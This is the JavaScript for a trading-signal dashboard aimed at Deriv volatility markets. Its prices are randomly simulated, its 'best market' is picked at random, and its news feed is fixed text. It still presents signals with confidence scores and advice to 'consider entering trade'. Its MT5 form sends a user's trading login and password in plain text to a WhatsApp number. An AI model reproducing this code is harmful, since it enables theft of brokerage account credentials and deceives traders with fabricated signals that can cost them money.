// ============ CONFIGURATION ============
const CONFIG = {
    markets: [
        { id: 'R_10', name: 'Volatility 10', type: '1s', icon: 'fa-bolt' },
        { id: 'R_10_index', name: 'Volatility 10 Index', type: 'index', icon: 'fa-chart-line' },
        { id: 'R_15', name: 'Volatility 15', type: '1s', icon: 'fa-bolt' },
        { id: 'R_15_index', name: 'Volatility 15 Index', type: 'index', icon: 'fa-chart-line' },
        { id: 'R_25', name: 'Volatility 25', type: '1s', icon: 'fa-bolt' },
        { id: 'R_25_index', name: 'Volatility 25 Index', type: 'index', icon: 'fa-chart-line' },
        { id: 'R_50', name: 'Volatility 50', type: '1s', icon: 'fa-bolt' },
        { id: 'R_50_index', name: 'Volatility 50 Index', type: 'index', icon: 'fa-chart-line' },
        { id: 'R_75', name: 'Volatility 75', type: '1s', icon: 'fa-bolt' },
        { id: 'R_75_index', name: 'Volatility 75 Index', type: 'index', icon: 'fa-chart-line' },
        { id: 'R_100', name: 'Volatility 100', type: '1s', icon: 'fa-bolt' },
        { id: 'R_100_index', name: 'Volatility 100 Index', type: 'index', icon: 'fa-chart-line' }
    ],
    digitsHistory: [],
    maxHistory: 100,
    currentMarket: 'R_100',
    voiceEnabled: true,
    voiceGender: 'male',
    wsConnection: null,
    priceChart: null,
    digitsChart: null,
    signalHistory: [],
    priceData: [],
    digitsData: Array(10).fill(0)
};

// ============ INITIALIZATION ============
document.addEventListener('DOMContentLoaded', () => {
    initializeMarkets();
    initializeCharts();
    initializeVoice();
    initializeWebSocket();
    startMarketSimulation();
    loadNews();
    loadEconomicCalendar();
    loadCommodities();
    setupEventListeners();
    startMatrixEffect();
});

// ============ MARKET INITIALIZATION ============
function initializeMarkets() {
    const marketGrid = document.getElementById('marketGrid');
    marketGrid.innerHTML = CONFIG.markets.map(market => `
        <div class="market-card glass-card rounded-xl p-3 text-center transition ${CONFIG.currentMarket === market.id ? 'active' : ''}" data-market="${market.id}">
            <i class="fas ${market.icon} text-2xl mb-1 ${CONFIG.currentMarket === market.id ? 'text-purple-400' : 'text-gray-400'}"></i>
            <p class="text-xs font-semibold">${market.name}</p>
            <p class="text-xs text-gray-500">${market.type}</p>
        </div>
    `).join('');
    
    document.querySelectorAll('.market-card').forEach(card => {
        card.addEventListener('click', () => {
            document.querySelectorAll('.market-card').forEach(c => c.classList.remove('active'));
            card.classList.add('active');
            CONFIG.currentMarket = card.dataset.market;
            resetAnalysis();
        });
    });
}

// ============ CHART INITIALIZATION ============
function initializeCharts() {
    const priceCtx = document.getElementById('priceChart').getContext('2d');
    CONFIG.priceChart = new Chart(priceCtx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Price',
                data: [],
                borderColor: '#667eea',
                backgroundColor: 'rgba(102, 126, 234, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: true,
            plugins: {
                legend: { labels: { color: '#9CA3AF' } }
            },
            scales: {
                y: { grid: { color: '#374151' }, ticks: { color: '#9CA3AF' } },
                x: { grid: { color: '#374151' }, ticks: { color: '#9CA3AF' } }
            }
        }
    });
    
    const digitsCtx = document.getElementById('digitsDonut').getContext('2d');
    CONFIG.digitsChart = new Chart(digitsCtx, {
        type: 'doughnut',
        data: {
            labels: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            datasets: [{
                data: CONFIG.digitsData,
                backgroundColor: [
                    '#ef4444', '#f59e0b', '#eab308', '#84cc16', '#10b981',
                    '#06b6d4', '#3b82f6', '#8b5cf6', '#d946ef', '#ec4899'
                ],
                borderWidth: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: true,
            plugins: {
                legend: { position: 'bottom', labels: { color: '#9CA3AF', font: { size: 10 } } }
            }
        }
    });
}

// ============ VOICE SYSTEM ============
function initializeVoice() {
    const voiceToggle = document.getElementById('voiceToggle');
    const voiceGender = document.getElementById('voiceGender');
    
    voiceToggle.addEventListener('click', () => {
        CONFIG.voiceEnabled = !CONFIG.voiceEnabled;
        voiceToggle.classList.toggle('active', CONFIG.voiceEnabled);
        voiceToggle.innerHTML = CONFIG.voiceEnabled ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
        speak(CONFIG.voiceEnabled ? 'Voice alerts enabled' : 'Voice alerts disabled');
    });
    
    voiceGender.addEventListener('change', (e) => {
        CONFIG.voiceGender = e.target.value;
        speak(`Voice changed to ${CONFIG.voiceGender} voice`);
    });
}

function speak(message) {
    if (!CONFIG.voiceEnabled) return;
    
    const utterance = new SpeechSynthesisUtterance(message);
    utterance.voice = CONFIG.voiceGender === 'male' 
        ? speechSynthesis.getVoices().find(v => v.name.includes('Google UK English Male'))
        : speechSynthesis.getVoices().find(v => v.name.includes('Google UK English Female'));
    utterance.rate = 0.9;
    utterance.pitch = CONFIG.voiceGender === 'male' ? 1 : 1.2;
    speechSynthesis.speak(utterance);
}

function playAlertSound() {
    const audio = document.getElementById('alertSound');
    audio.currentTime = 0;
    audio.play().catch(e => console.log('Audio play failed'));
}

// ============ MARKET ANALYSIS ENGINE ============
function analyzeDigits(lastDigit) {
    // Update digits history
    CONFIG.digitsHistory.push(lastDigit);
    if (CONFIG.digitsHistory.length > CONFIG.maxHistory) {
        CONFIG.digitsHistory.shift();
    }
    
    // Update digit frequency
    CONFIG.digitsData = Array(10).fill(0);
    CONFIG.digitsHistory.forEach(d => CONFIG.digitsData[d]++);
    
    // Update chart
    CONFIG.digitsChart.data.datasets[0].data = CONFIG.digitsData;
    CONFIG.digitsChart.update();
    
    // Calculate over/under trends
    const overDigits = [5, 6, 7, 8, 9];
    const underDigits = [0, 1, 2, 3, 4];
    
    let overCount = CONFIG.digitsHistory.filter(d => overDigits.includes(d)).length;
    let underCount = CONFIG.digitsHistory.filter(d => underDigits.includes(d)).length;
    
    const overPercentage = (overCount / CONFIG.digitsHistory.length) * 100;
    const underPercentage = (underCount / CONFIG.digitsHistory.length) * 100;
    
    document.getElementById('overTrend').textContent = `${overPercentage.toFixed(1)}%`;
    document.getElementById('underTrend').textContent = `${underPercentage.toFixed(1)}%`;
    
    // Find dominant digit
    const dominantDigit = CONFIG.digitsData.indexOf(Math.max(...CONFIG.digitsData));
    document.getElementById('dominantDigit').textContent = dominantDigit;
    
    // Update digits stats display
    updateDigitsStats();
    
    return { overPercentage, underPercentage, dominantDigit };
}

function updateDigitsStats() {
    const statsDiv = document.getElementById('digitsStats');
    statsDiv.innerHTML = CONFIG.digitsData.map((count, i) => `
        <div class="flex justify-between items-center">
            <span class="text-sm">Digit ${i}</span>
            <div class="flex-1 mx-3 bg-gray-700 rounded-full h-2">
                <div class="h-2 rounded-full transition-all" style="width: ${(count / CONFIG.maxHistory) * 100}%; background: ${CONFIG.digitsChart.data.datasets[0].backgroundColor[i]}"></div>
            </div>
            <span class="text-sm font-semibold">${count}</span>
        </div>
    `).join('');
}

function analyzePriceAction(currentPrice, historicalPrices) {
    // Calculate indicators
    const sma20 = calculateSMA(historicalPrices, 20);
    const sma50 = calculateSMA(historicalPrices, 50);
    const rsi = calculateRSI(historicalPrices, 14);
    const bollinger = calculateBollingerBands(historicalPrices, 20, 2);
    
    // Determine trend
    let trend = 'neutral';
    let signal = null;
    let confidence = 0;
    let reasons = [];
    
    if (sma20 && sma50) {
        if (sma20 > sma50 * 1.01) {
            trend = 'bullish';
            confidence += 30;
            reasons.push('Golden crossover detected');
        } else if (sma20 < sma50 * 0.99) {
            trend = 'bearish';
            confidence += 30;
            reasons.push('Death crossover detected');
        }
    }
    
    // RSI analysis
    if (rsi && rsi < 30) {
        signal = 'RISE';
        confidence += 35;
        reasons.push('RSI oversold');
    } else if (rsi && rsi > 70) {
        signal = 'FALL';
        confidence += 35;
        reasons.push('RSI overbought');
    }
    
    // Bollinger Bands analysis
    if (bollinger && currentPrice <= bollinger.lower) {
        signal = 'RISE';
        confidence += 25;
        reasons.push('Price at lower Bollinger Band');
    } else if (bollinger && currentPrice >= bollinger.upper) {
        signal = 'FALL';
        confidence += 25;
        reasons.push('Price at upper Bollinger Band');
    }
    
    // Update indicators display
    updateIndicatorsDisplay({ sma20, sma50, rsi, bollinger, trend });
    
    return { signal, confidence, reasons, trend };
}

function calculateSMA(prices, period) {
    if (prices.length < period) return null;
    const sum = prices.slice(-period).reduce((a, b) => a + b, 0);
    return sum / period;
}

function calculateRSI(prices, period) {
    if (prices.length < period + 1) return null;
    
    let gains = 0, losses = 0;
    for (let i = prices.length - period; i < prices.length; i++) {
        const change = prices[i] - prices[i - 1];
        if (change >= 0) gains += change;
        else losses -= change;
    }
    
    const avgGain = gains / period;
    const avgLoss = losses / period;
    
    if (avgLoss === 0) return 100;
    const rs = avgGain / avgLoss;
    return 100 - (100 / (1 + rs));
}

function calculateBollingerBands(prices, period, multiplier) {
    const sma = calculateSMA(prices, period);
    if (!sma) return null;
    
    const variance = prices.slice(-period).reduce((acc, price) => acc + Math.pow(price - sma, 2), 0) / period;
    const stdDev = Math.sqrt(variance);
    
    return {
        upper: sma + (stdDev * multiplier),
        middle: sma,
        lower: sma - (stdDev * multiplier)
    };
}

function updateIndicatorsDisplay(indicators) {
    const indicatorsDiv = document.getElementById('indicators');
    indicatorsDiv.innerHTML = `
        <div class="flex justify-between">
            <span class="text-sm text-gray-400">SMA 20:</span>
            <span class="text-sm font-semibold">${indicators.sma20 ? indicators.sma20.toFixed(4) : 'N/A'}</span>
        </div>
        <div class="flex justify-between">
            <span class="text-sm text-gray-400">SMA 50:</span>
            <span class="text-sm font-semibold">${indicators.sma50 ? indicators.sma50.toFixed(4) : 'N/A'}</span>
        </div>
        <div class="flex justify-between">
            <span class="text-sm text-gray-400">RSI:</span>
            <span class="text-sm font-semibold ${indicators.rsi && indicators.rsi > 70 ? 'text-red-400' : indicators.rsi && indicators.rsi < 30 ? 'text-green-400' : 'text-white'}">${indicators.rsi ? indicators.rsi.toFixed(1) : 'N/A'}</span>
        </div>
        <div class="flex justify-between">
            <span class="text-sm text-gray-400">Trend:</span>
            <span class="text-sm font-semibold ${indicators.trend === 'bullish' ? 'text-green-400' : indicators.trend === 'bearish' ? 'text-red-400' : 'text-yellow-400'}">${indicators.trend.toUpperCase()}</span>
        </div>
    `;
}

function generateSignal() {
    const lastDigit = CONFIG.digitsHistory[CONFIG.digitsHistory.length - 1];
    const digitAnalysis = analyzeDigits(lastDigit);
    const lastPrice = CONFIG.priceData[CONFIG.priceData.length - 1];
    const priceAnalysis = analyzePriceAction(lastPrice, CONFIG.priceData);
    
    let finalSignal = null;
    let finalConfidence = 0;
    let marketSuggestion = CONFIG.currentMarket;
    
    // Combine digit and price analysis
    if (priceAnalysis.signal) {
        finalSignal = priceAnalysis.signal;
        finalConfidence = priceAnalysis.confidence;
    } else if (digitAnalysis.overPercentage > 65) {
        finalSignal = 'OVER 5';
        finalConfidence = digitAnalysis.overPercentage;
    } else if (digitAnalysis.underPercentage > 65) {
        finalSignal = 'UNDER 5';
        finalConfidence = digitAnalysis.underPercentage;
    }
    
    // Find best performing market (simulated)
    const bestMarkets = ['R_100', 'R_75', 'R_50'];
    marketSuggestion = bestMarkets[Math.floor(Math.random() * bestMarkets.length)];
    
    if (finalSignal && finalConfidence > 55) {
        displaySignal(finalSignal, finalConfidence, priceAnalysis.reasons, marketSuggestion);
        updateSignalStrength(finalConfidence);
        return true;
    }
    
    return false;
}

function displaySignal(signal, confidence, reasons, suggestedMarket) {
    const signalDiv = document.getElementById('currentSignal');
    const isRise = signal === 'RISE' || signal === 'OVER 5';
    
    signalDiv.className = `p-4 rounded-lg text-center transition-all ${isRise ? 'bg-green-900/30 border border-green-500 glow-green' : 'bg-red-900/30 border border-red-500 glow-red'}`;
    signalDiv.innerHTML = `
        <div class="signal-pulse">
            <i class="fas ${isRise ? 'fa-arrow-up' : 'fa-arrow-down'} text-4xl ${isRise ? 'text-green-400' : 'text-red-400'} mb-2"></i>
            <p class="text-2xl font-bold ${isRise ? 'text-green-400' : 'text-red-400'}">${signal}</p>
            <p class="text-sm text-gray-300 mt-2">Confidence: ${confidence.toFixed(0)}%</p>
            <p class="text-xs text-gray-400 mt-1">Best Market: ${suggestedMarket}</p>
            ${reasons ? `<div class="text-xs text-gray-400 mt-2">${reasons.map(r => `<span class="inline-block px-2 py-1 bg-gray-800 rounded mr-1 mt-1">${r}</span>`).join('')}</div>` : ''}
        </div>
    `;
    
    // Voice alert
    speak(`${signal} signal detected with ${confidence.toFixed(0)} percent confidence. Best market is ${suggestedMarket}`);
    playAlertSound();
    
    // Add to history
    addToSignalHistory(signal, confidence, suggestedMarket);
}

function addToSignalHistory(signal, confidence, market) {
    CONFIG.signalHistory.unshift({ signal, confidence, market, time: new Date().toLocaleTimeString() });
    if (CONFIG.signalHistory.length > 10) CONFIG.signalHistory.pop();
    
    const historyDiv = document.getElementById('signalHistory');
    historyDiv.innerHTML = CONFIG.signalHistory.map(s => `
        <div class="flex justify-between items-center p-2 bg-gray-800/50 rounded-lg">
            <div class="flex items-center">
                <i class="fas ${s.signal === 'RISE' || s.signal === 'OVER 5' ? 'fa-arrow-up text-green-400' : 'fa-arrow-down text-red-400'} mr-2"></i>
                <span class="text-sm font-semibold">${s.signal}</span>
            </div>
            <span class="text-xs text-gray-400">${s.market}</span>
            <span class="text-xs text-gray-500">${s.time}</span>
            <span class="text-xs ${s.confidence > 70 ? 'text-green-400' : 'text-yellow-400'}">${s.confidence.toFixed(0)}%</span>
        </div>
    `).join('');
}

function updateSignalStrength(confidence) {
    const strengthBar = document.getElementById('signalStrength');
    const recommendation = document.getElementById('signalRecommendation');
    
    strengthBar.style.width = `${confidence}%`;
    strengthBar.style.background = `linear-gradient(90deg, #667eea, #764ba2)`;
    
    if (confidence >= 70) {
        recommendation.innerHTML = '<span class="text-green-400"><i class="fas fa-check-circle mr-1"></i>STRONG SIGNAL - Consider entering trade</span>';
    } else if (confidence >= 50) {
        recommendation.innerHTML = '<span class="text-yellow-400"><i class="fas fa-chart-line mr-1"></i>MODERATE SIGNAL - Monitor closely</span>';
    } else {
        recommendation.innerHTML = '<span class="text-gray-400"><i class="fas fa-clock mr-1"></i>WEAK SIGNAL - Wait for confirmation</span>';
    }
}

// ============ MARKET SIMULATION ============
function startMarketSimulation() {
    setInterval(() => {
        const volatility = Math.random() * 2;
        const lastPrice = CONFIG.priceData[CONFIG.priceData.length - 1] || 100;
        const change = (Math.random() - 0.5) * volatility;
        const newPrice = Math.max(0.01, lastPrice + change);
        
        CONFIG.priceData.push(newPrice);
        if (CONFIG.priceData.length > 50) CONFIG.priceData.shift();
        
        // Extract digit from price
        const digit = Math.floor(newPrice) % 10;
        
        // Update chart
        CONFIG.priceChart.data.labels = CONFIG.priceData.map((_, i) => i);
        CONFIG.priceChart.data.datasets[0].data = CONFIG.priceData;
        CONFIG.priceChart.update();
        
        // Update price display
        document.getElementById('lastPrice').textContent = newPrice.toFixed(4);
        document.getElementById('highPrice').textContent = Math.max(...CONFIG.priceData).toFixed(4);
        document.getElementById('lowPrice').textContent = Math.min(...CONFIG.priceData).toFixed(4);
        
        // Analyze digit
        analyzeDigits(digit);
        
        // Generate signal every 15-30 seconds
        if (Math.random() < 0.15) {
            generateSignal();
        }
    }, 2000);
}

// ============ WEB SIMULATION (Instead of actual Deriv API) ============
function initializeWebSocket() {
    console.log('Market analysis engine initialized');
    // In production, connect to Deriv WebSocket here
}

function resetAnalysis() {
    CONFIG.digitsHistory = [];
    CONFIG.digitsData = Array(10).fill(0);
    CONFIG.priceData = [];
    speak(`Switched to ${CONFIG.currentMarket} market`);
}

// ============ NEWS & DATA LOADING ============
function loadNews() {
    const news = [
        { title: 'Federal Reserve signals rate cut in September', impact: 'high', time: '2 hours ago', source: 'Bloomberg' },
        { title: 'Gold hits all-time high above $2,400', impact: 'high', time: '3 hours ago', source: 'Reuters' },
        { title: 'Oil prices surge 5% on Middle East tensions', impact: 'medium', time: '5 hours ago', source: 'CNBC' },
        { title: 'Bitcoin volatility expected ahead of halving event', impact: 'medium', time: '6 hours ago', source: 'CoinDesk' },
        { title: 'European markets close higher on tech rally', impact: 'low', time: '8 hours ago', source: 'FT' },
        { title: 'Bank of Japan intervenes to support Yen', impact: 'high', time: '12 hours ago', source: 'Nikkei' },
        { title: 'US jobless claims fall more than expected', impact: 'high', time: '1 day ago', source: 'WSJ' },
        { title: 'Crypto market cap surpasses $2.5 trillion', impact: 'medium', time: '1 day ago', source: 'CoinMarketCap' }
    ];
    
    const newsFeed = document.getElementById('newsFeed');
    newsFeed.innerHTML = news.map(item => `
        <div class="bg-gray-800/30 rounded-lg p-4 hover:bg-gray-800/50 transition">
            <div class="flex justify-between mb-2">
                <span class="text-sm font-semibold text-purple-400">${item.source}</span>
                <span class="text-xs text-gray-500">${item.time}</span>
            </div>
            <p class="text-sm text-white">${item.title}</p>
            <div class="mt-2 flex items-center">
                <span class="text-xs px-2 py-1 rounded ${item.impact === 'high' ? 'bg-red-900/50 text-red-400' : item.impact === 'medium' ? 'bg-yellow-900/50 text-yellow-400' : 'bg-gray-700 text-gray-400'}">
                    ${item.impact.toUpperCase()} IMPACT
                </span>
            </div>
        </div>
    `).join('');
}

function loadEconomicCalendar() {
    const events = [
        { time: '10:30 AM', currency: 'USD', event: 'Fed Chair Powell Speech', impact: 'high' },
        { time: '08:30 AM', currency: 'EUR', event: 'ECB Interest Rate Decision', impact: 'high' },
        { time: '04:30 AM', currency: 'JPY', event: 'Japan CPI Data', impact: 'medium' },
        { time: '02:00 PM', currency: 'GBP', event: 'UK GDP Report', impact: 'high' },
        { time: '12:00 PM', currency: 'CAD', event: 'Canada Employment Change', impact: 'medium' }
    ];
    
    const calendar = document.getElementById('economicCalendar');
    calendar.innerHTML = events.map(event => `
        <div class="bg-gray-800/30 rounded-lg p-3">
            <div class="flex justify-between items-center">
                <div>
                    <p class="text-xs text-gray-400">${event.time}</p>
                    <p class="text-sm font-semibold">${event.event}</p>
                    <p class="text-xs text-gray-500">${event.currency}</p>
                </div>
                <span class="text-xs px-2 py-1 rounded ${event.impact === 'high' ? 'bg-red-900/50 text-red-400' : 'bg-yellow-900/50 text-yellow-400'}">
                    ${event.impact.toUpperCase()}
                </span>
            </div>
        </div>
    `).join('');
}

function loadCommodities() {
    const commodities = [
        { name: 'Gold', price: 2350.50, change: '+1.2%', changeClass: 'text-green-400' },
        { name: 'Silver', price: 28.75, change: '+0.8%', changeClass: 'text-green-400' },
        { name: 'Crude Oil', price: 85.30, change: '-0.5%', changeClass: 'text-red-400' },
        { name: 'Bitcoin', price: 62450, change: '+2.3%', changeClass: 'text-green-400' },
        { name: 'Ethereum', price: 3450, change: '+1.5%', changeClass: 'text-green-400' },
        { name: 'S&P 500', price: 5120, change: '+0.3%', changeClass: 'text-green-400' }
    ];
    
    const commoditiesDiv = document.getElementById('commodities');
    commoditiesDiv.innerHTML = commodities.map(comm => `
        <div class="flex justify-between items-center p-3 bg-gray-800/30 rounded-lg">
            <span class="text-sm font-semibold">${comm.name}</span>
            <span class="text-sm text-white">$${comm.price.toLocaleString()}</span>
            <span class="text-sm ${comm.changeClass}">${comm.change}</span>
        </div>
    `).join('');
}

// ============ FORM HANDLERS ============
function setupEventListeners() {
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const tabId = btn.dataset.tab;
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(content => content.classList.add('hidden'));
            document.getElementById(`${tabId}Tab`).classList.remove('hidden');
        });
    });
    
    // MT5 Form submission
    document.getElementById('mt5Form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const login = document.getElementById('mt5Login').value;
        const password = document.getElementById('mt5Password').value;
        const server = document.getElementById('mt5Server').value;
        
        if (!login || !password) {
            showNotification('Please fill in all MT5 credentials', 'error');
            return;
        }
        
        // Send to WhatsApp
        const message = `*KAIRON MT5 Bot Request*%0A%0A*Login:* ${login}%0A*Password:* ${password}%0A*Server:* ${server}%0A*Time:* ${new Date().toLocaleString()}`;
        window.open(`https://wa.me/254799045699?text=${message}`, '_blank');
        
        showNotification('Credentials sent! Our team will activate your bot within 24 hours.', 'success');
        document.getElementById('mt5Form').reset();
    });
    
    // Affiliate link
    document.getElementById('affiliateLink').addEventListener('click', (e) => {
        e.preventDefault();
        window.open('https://track.deriv.com/affiliate', '_blank');
    });
    
    // Manual analysis button
    document.getElementById('manualAnalysisBtn').addEventListener('click', () => {
        generateSignal();
        showNotification('Manual analysis completed', 'info');
    });
}

function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.className = `fixed top-20 right-4 px-6 py-3 rounded-lg shadow-lg z-50 transition-all ${
        type === 'success' ? 'bg-green-600' : type === 'error' ? 'bg-red-600' : 'bg-blue-600'
    } text-white`;
    notification.innerHTML = `
        <div class="flex items-center">
            <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'} mr-2"></i>
            <span>${message}</span>
        </div>
    `;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 5000);
}

// ============ MATRIX EFFECT ============
function startMatrixEffect() {
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);
    
    function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#0f0';
        ctx.font = `${fontSize}px monospace`;
        
        for (let i = 0; i < drops.length; i++) {
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    
    setInterval(draw, 50);
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

// ============ EXPORT FUNCTIONS FOR GLOBAL ACCESS ============
window.getSignal = generateSignal;
window.speak = speak;
